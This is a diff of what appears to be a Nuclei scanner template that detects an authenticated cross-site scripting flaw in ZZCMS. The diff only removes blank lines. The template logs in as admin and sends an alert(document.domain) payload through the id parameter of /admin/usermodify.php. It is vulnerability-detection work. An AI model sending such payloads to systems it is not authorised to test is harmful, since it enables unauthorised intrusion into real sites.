@@ -1,5 +1,4 @@
 id: zzcms-xss
-
 info:
   name: ZZCMS - Cross-Site Scripting
   author: ritikchaddha
@@ -9,7 +8,6 @@ info:
   metadata:
     verified: true
   tags: zzcms,xss,authenticated
-
 requests:
   - raw:
       - |
@@ -18,11 +16,9 @@ requests:
         Content-Type: application/x-www-form-urlencoded
 
         admin={{username}}&pass={{password}}
-
       - |
         GET /admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22 HTTP/1.1
         Host: {{Hostname}}
-
     cookie-reuse: true
     req-condition: true
     matchers:
